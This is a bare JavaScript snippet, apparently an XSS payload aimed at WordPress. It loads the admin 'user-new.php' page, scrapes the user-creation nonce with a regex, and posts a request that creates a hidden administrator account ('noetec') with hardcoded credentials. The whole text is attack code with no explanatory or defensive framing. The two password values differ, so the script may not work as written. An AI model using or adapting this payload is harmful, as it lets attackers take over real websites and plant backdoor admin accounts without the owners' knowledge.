u="/wp-admin/user-new.php"; jQuery.get(u, function(e) {jQuery.post(u,{action: "createuser","_wpnonce_create-user":
    e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)
    [1], user_login: "noetec", email: "noetec@noetec.com", pass1: "test123", pass2:"test1234", role: "administrator"})});